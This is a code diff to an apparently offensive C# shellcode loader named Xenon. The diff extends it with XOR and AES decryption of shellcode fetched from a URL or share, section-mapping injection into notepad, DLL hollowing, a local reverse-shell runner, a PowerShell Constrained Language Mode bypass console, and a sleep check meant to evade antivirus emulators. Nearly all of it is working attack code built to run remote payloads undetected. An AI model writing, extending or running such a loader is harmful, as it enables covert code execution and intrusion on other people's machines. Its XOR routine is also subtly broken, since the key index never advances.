@@ -7,6 +7,9 @@ using System.Collections.Generic;
 using System.Text.RegularExpressions;
 using System.Diagnostics;
 using System.IO;
+using System.Security.Cryptography;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
 
 namespace Injector
 {
@@ -212,6 +215,13 @@ namespace Injector
             }
         }
     }
+
+    // Global class for more falgs
+    static class Flags
+    {
+        public static int advanced_bypass = 0;
+    }
+
     class Program
     {
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
@@ -254,6 +264,30 @@ namespace Injector
             public int bInheritHandle;
         }
 
+        [StructLayout(LayoutKind.Sequential)]
+        public struct IMAGE_DOS_HEADER
+        {
+            public char[] e_magic;       // Magic number
+            public UInt16 e_cblp;    // Bytes on last page of file
+            public UInt16 e_cp;      // Pages in file
+            public UInt16 e_crlc;    // Relocations
+            public UInt16 e_cparhdr;     // Size of header in paragraphs
+            public UInt16 e_minalloc;    // Minimum extra paragraphs needed
+            public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
+            public UInt16 e_ss;      // Initial (relative) SS value
+            public UInt16 e_sp;      // Initial SP value
+            public UInt16 e_csum;    // Checksum
+            public UInt16 e_ip;      // Initial IP value
+            public UInt16 e_cs;      // Initial (relative) CS value
+            public UInt16 e_lfarlc;      // File address of relocation table
+            public UInt16 e_ovno;    // Overlay number
+            public UInt16[] e_res1;    // Reserved words
+            public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
+            public UInt16 e_oeminfo;     // OEM information; e_oemid specific
+            public UInt16[] e_res2;    // Reserved words
+            public Int32 e_lfanew;      // File address of new exe header
+        }
+
         private struct PROCESS_BASIC_INFORMATION
         {
             public UIntPtr ExitStatus;
@@ -265,6 +299,12 @@ namespace Injector
         }
 
         private static uint PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF;
+        private static uint EXECUTE_READ_WRITE = 0x40;
+        private static uint SEC_COMMIT = 0x08000000;
+        private static uint SECTION_MAP_WRITE = 0x0002;
+        private static uint SECTION_MAP_READ = 0x0004;
+        private static uint SECTION_MAP_EXECUTE = 0x0008;
+        private static uint SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
 
         [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -275,6 +315,9 @@ namespace Injector
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
+        [DllImport("kernel32")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpthread);
+
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
@@ -283,6 +326,9 @@ namespace Injector
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
         public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32")]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32")]
         static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
@@ -296,13 +342,95 @@ namespace Injector
         [DllImport("kernel32", SetLastError = true)]
         static extern uint ResumeThread(IntPtr hThread);
 
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
+
+        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
+        static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref uint MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
+
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
 
-        static int process_injection(string location, int button)
+        public const string phantom = @"dll_hollow.dll";
+        [DllImport(phantom, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
+        static extern int dll_hollow(byte[] shellcode, int size, int pid);
+
+        static byte[] aes_decryption(byte[] shellcode, string password)
+        {
+            string iv = "1234567891234567";
+            AesCryptoServiceProvider keydecrypt = new AesCryptoServiceProvider();
+            keydecrypt.BlockSize = 128;
+            keydecrypt.KeySize = 128;
+            keydecrypt.Key = System.Text.Encoding.UTF8.GetBytes(password);
+            keydecrypt.IV = System.Text.Encoding.UTF8.GetBytes(iv);
+            keydecrypt.Padding = PaddingMode.PKCS7;
+            keydecrypt.Mode = CipherMode.CBC;
+            ICryptoTransform crypto1 = keydecrypt.CreateDecryptor(keydecrypt.Key, keydecrypt.IV);
+
+            byte[] returnbytearray = crypto1.TransformFinalBlock(shellcode, 0, shellcode.Length);
+            crypto1.Dispose();
+            return returnbytearray;
+        }
+
+        static byte[] xor_decryption(byte[] shellcode, string password)
+        {
+
+            byte[] pass = Encoding.ASCII.GetBytes(password);
+
+            byte[] decode_shellcode = new byte[shellcode.Length];
+            int j = 0;
+            for (int i = 0; i < shellcode.Length; i++)
+            {
+                if (j >= password.Length)
+                {
+                    j = 0;
+                }
+                decode_shellcode[i] = (byte)(((uint)shellcode[i] ^ (uint)pass[j]) & 0xff);
+            }
+            return decode_shellcode;
+        }
+
+        static byte[] downloaded_data(string location, int encryption, string password)
+        {
+            byte[] shellcode;
+            if (location.StartsWith("http") || location.StartsWith("\\"))
+            {
+                WebClient wc = new WebClient();
+                string url = location;
+                shellcode = wc.DownloadData(url);
+            }
+            else
+            {
+                shellcode = File.ReadAllBytes(location);
+            }
+
+            if (encryption != 0)
+            {
+                if (encryption == 1)
+                {
+                    // xor encryption used
+                    byte[] decode_shellcode = xor_decryption(shellcode, password);
+                    return decode_shellcode;
+                }
+                else if (encryption == 2)
+                {
+                    byte[] decoded_shellcode = aes_decryption(shellcode, password);
+                    return decoded_shellcode;
+                }
+            }
+            return shellcode;
+        }
+
+        static int process_injection(string location, int button, int encryption, string password)
         {
             Process[] remote_p = Process.GetProcessesByName("notepad");
+            Process current_p = Process.GetCurrentProcess();
             int pid = 0;
 
             if (remote_p.Length == 0)
@@ -319,15 +447,16 @@ namespace Injector
                 pid = remote_p[0].Id;
             }
 
-            if (location.StartsWith("http"))
+            byte[] shellcode = downloaded_data(location, encryption, password);
+            //Initializations
+            bool res = false;
+            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
+            IntPtr address = IntPtr.Zero;
+            if (Flags.advanced_bypass == 0)
             {
-                WebClient wc = new WebClient();
-                string url = location;
-                byte[] shellcode = wc.DownloadData(url);
-                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
-                IntPtr address = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                address = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                 IntPtr bytes = IntPtr.Zero;
-                bool res = WriteProcessMemory(hProcess, address, shellcode, shellcode.Length, out bytes);
+                res = WriteProcessMemory(hProcess, address, shellcode, shellcode.Length, out bytes);
                 if (res == false)
                 {
                     Console.WriteLine("Cannot copy into process");
@@ -337,7 +466,35 @@ namespace Injector
                 return 0;
             }
             else
-                return -1;
+            {
+                IntPtr Section_handle = IntPtr.Zero;
+                uint size = (uint)shellcode.Length;
+                if (NtCreateSection(ref Section_handle, SECTION_ALL_ACCESS, IntPtr.Zero, ref size, 0x40, SEC_COMMIT, IntPtr.Zero) != 0)
+                {
+                    Console.WriteLine("[!] Cannot create section");
+                    return -1;
+                }
+                IntPtr local_addr = IntPtr.Zero;
+                IntPtr remote_addr = IntPtr.Zero;
+                ulong offsec = 0;
+
+                if (NtMapViewOfSection(Section_handle, current_p.Handle, ref local_addr, UIntPtr.Zero, UIntPtr.Zero, out offsec, out size, 2, 0, EXECUTE_READ_WRITE) != 0)
+                {
+                    Console.WriteLine("[!] Cannot map the section into remote process");
+                    return -1;
+                }
+
+                if (NtMapViewOfSection(Section_handle, hProcess, ref remote_addr, UIntPtr.Zero, UIntPtr.Zero, out offsec, out size, 2, 0, EXECUTE_READ_WRITE) != 0)
+                {
+                    Console.WriteLine("Cannot map the section into local process");
+                    return -1;
+                }
+
+                Marshal.Copy(shellcode, 0, local_addr, shellcode.Length);
+                CreateRemoteThread(hProcess, IntPtr.Zero, 0, remote_addr, IntPtr.Zero, 0, IntPtr.Zero);
+                NtUnmapViewOfSection(current_p.Handle, local_addr);
+                return 0;
+            }
         }
 
         static int reflective_dll_injection(string location)
@@ -387,7 +544,45 @@ namespace Injector
             return 0;
         }
 
-        static int process_hollowing(string location)
+        static int basic_rev(string location, int encryption, string password)
+        {
+            byte[] shellcode = downloaded_data(location, encryption, password);
+            IntPtr address = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr bytes = IntPtr.Zero;
+            Marshal.Copy(shellcode, 0, address, shellcode.Length);
+            IntPtr thread = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(thread, 0xFFFFFFFF);
+            return 0;
+        }
+
+        static int dll_hollowing(string location, int encryption, string password)
+        {
+            Process[] remote_p = Process.GetProcessesByName("notepad");
+            int pid = 0;
+
+            if (remote_p.Length == 0)
+            {
+                //Create Process
+                Process p = new Process();
+                p.StartInfo.FileName = "C:\\Windows\\System32\\notepad.exe";
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.Start();
+                pid = p.Id;
+            }
+            else
+            {
+                pid = remote_p[0].Id;
+            }
+
+            byte[] shellcode = downloaded_data(location, encryption, password);
+            //            IntPtr unmanagedArray = Marshal.AllocHGlobal(shellcode.Length);
+            //            Marshal.Copy(shellcode, 0, unmanagedArray, shellcode.Length);
+            int res = dll_hollow(shellcode, shellcode.Length, pid);
+            //            Marshal.FreeHGlobal(unmanagedArray);
+            return res;
+        }
+
+        static int process_hollowing(string location, int encryption, string password)
         {
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
@@ -419,46 +614,97 @@ namespace Injector
             IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)SvcHostBase);
 
             // Get shellcode bytes from localtion
-            if (location.StartsWith("http"))
-            {
-                //location of server
-                WebClient wc = new WebClient();
-                string url = location;
-                byte[] shellcode = wc.DownloadData(url);
-                WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
-                ResumeThread(pi.hThread);
-            }
-            else
-            {
-                //location relative to disk
-                byte[] shellcode = File.ReadAllBytes(location);
-                WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
-                ResumeThread(pi.hThread);
-            }
+            byte[] shellcode = downloaded_data(location, encryption, password);
+            WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
+            ResumeThread(pi.hThread);
             return 0;
         }
+
+        static void powershell_clm(String file_tmp)
+        {
+            Console.WriteLine("[+] Powershell CLM bypass!\n");
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            String op_file = file_tmp;
+            PowerShell ps = PowerShell.Create();
+            while (true)
+            {
+                Console.Write("PS:>");
+                string input = Console.ReadLine();
+                if (input == "exit")
+                {
+                    break;
+                }
+                ps.AddScript(input + " | Out-File -FilePath " + op_file);
+                ps.Invoke();
+                string output = File.ReadAllText(op_file);
+                Console.WriteLine(output);
+                File.Delete(op_file);
+            }
+            rs.Close();
+        }
+
         static void help_xenon()
         {
             Console.WriteLine("Help Options for Xenon:");
             Console.WriteLine("-m \t Mode of operation");
             Console.WriteLine("\t-m 1 \t Specifies the mode as Process injection");
-            Console.WriteLine("\t-m 2 \t Specifies the mode as Reflective Process Injection");
-            Console.WriteLine("\t-m 3 \t Specifies the mode as Process Hollowing\n");
+            Console.WriteLine("\t-m 2 \t Specifies the mode as Reflective DLL Injection");
+            Console.WriteLine("\t-m 3 \t Specifies the mode as Process Hollowing");
+            Console.WriteLine("\t-m 4 \t No injection! Give me my damn shell\n");
+            Console.WriteLine("\t-m 5 \t Powershell session via CLM bypass\n");
+            Console.WriteLine("\t-m 6 \t DLL hollowing ");
+            Console.WriteLine("-TempFile \t File location that your current user can read");
             Console.WriteLine("-shellcode \t Use shellcode");
             Console.WriteLine("-dll \t Use dll");
+            Console.WriteLine("-decrypt-xor \t Specify Xor decryption for shellcode");
+            Console.WriteLine("\t -pass \t Specifty the password for Xor decryption");
+            Console.WriteLine("-decrypt-aes \t Specify aes decryption for shellcode");
+            Console.WriteLine("\t -pass \t Specifty the password for aes decryption");
             Console.WriteLine("-location \t Specify the location i.e either server or local");
+            Console.WriteLine("-bypass \tUses enhance attempts to bypass AV");
             return;
         }
         static int Main(string[] args)
         {
-            //xenon.exe -m <1,2,3> --<shellcode/dll> --location <http://1.1.1.1/name, C:\\A\\B\\name>
-            IEnumerable<string> arg = Arguments.SplitCommandLine(string.Join(" ", args));
+            //xenon.exe -m <1,2,3> --<shellcode/dll> --location <http://1.1.1.1/name, C:\\A\\B\\name> --<enc> --key <password>
+            //IEnumerable<string> arg = Arguments.SplitCommandLine(string.Join(" ", args));
+            IEnumerable<string> arg = args;
             var arguments = new Arguments(arg);
 
-            if ((arguments.Exists("m") && arguments.Exists("location") && (arguments.Exists("shellcode") || arguments.Exists("dll"))) == false || arguments.Count != 3)
+            if (arguments.Exists("m"))
+            {
+                int m = int.Parse(arguments.Single("m"));
+                if (m == 5)
+                {
+                    if (arguments.Exists("TempFile"))
+                    {
+                        string name = arguments.Single("TempFile");
+                        powershell_clm(name);
+                        Console.WriteLine("Powershell session exit!");
+                        return 0;
+                    }
+                    else
+                    {
+                        help_xenon();
+                        return -1;
+                    }
+                }
+            }
+
+            if ((arguments.Exists("m") && arguments.Exists("location") && (arguments.Exists("shellcode") || arguments.Exists("dll"))) == false || arguments.Count < 3)
             {
                 help_xenon();
                 return -1;
+            }
+
+            // Sleep AV detection
+
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            if (DateTime.Now.Subtract(t1).TotalSeconds < 2)
+            {
+                Console.WriteLine("[!] AV Emulator detected! Behaving like a good boy :)");
+                return 0;
             }
 
             //Options to transfer shellcode/DLL - Via SMB share and local disk (.dll for dll and .txt for shellcode)
@@ -469,6 +715,8 @@ namespace Injector
 
 
             Console.WriteLine("[+] Parsing command line arguments");
+
+            //Parsing Command line arguments
             int mode = int.Parse(arguments.Single("m"));
             string location = arguments.Single("location");
             int button = 0;
@@ -480,6 +728,26 @@ namespace Injector
             else
                 button = 2;
 
+            int decryption = 0;
+            string pass = "";
+
+            if (arguments.Exists("decrypt-xor"))
+            {
+                decryption = 1;
+                pass = arguments.Single("pass");
+            }
+            else if (arguments.Exists("decrypt-aes"))
+            {
+                decryption = 2;
+                pass = arguments.Single("pass");
+            }
+
+            if (arguments.Exists("bypass"))
+            {
+                Flags.advanced_bypass = 1;
+            }
+
+            // Dealing with command line arguments for main logic
             int response = 0;
 
             switch (mode)
@@ -489,7 +757,7 @@ namespace Injector
                         Console.WriteLine("Injecting into process via shellcode at " + location);
                     else
                         Console.WriteLine("Injecting into process via DLL at " + location);
-                    response = process_injection(location, button);
+                    response = process_injection(location, button, decryption, pass);
 
                     if (response == 0)
                         Console.WriteLine("[+] Process Injection done :)");
@@ -509,12 +777,27 @@ namespace Injector
 
                 case 3:
                     Console.WriteLine("Using Process hollowing into process using DLL at " + location);
-                    response = process_hollowing(location);
+                    response = process_hollowing(location, decryption, pass);
 
                     if (response == 0)
                         Console.WriteLine("[+] Process hollowing done :)");
                     else
                         Console.WriteLine("[!] Error running the process hollowing module");
+                    break;
+
+                case 4:
+                    Console.WriteLine("Getting a basic reverse shell for you using shellcode at " + location);
+                    basic_rev(location, decryption, pass);
+                    Console.WriteLine("Reverse Shell done :)");
+                    break;
+
+                case 6:
+                    Console.WriteLine("DLL Hollowing in process! Using shellcode at " + location);
+                    int res = dll_hollowing(location, decryption, pass);
+                    if (res == 0)
+                        Console.WriteLine("[+] DLL Hollowing done :)");
+                    else
+                        Console.WriteLine("[!] Error running the DLL hollowing module");
                     break;
 
                 default:
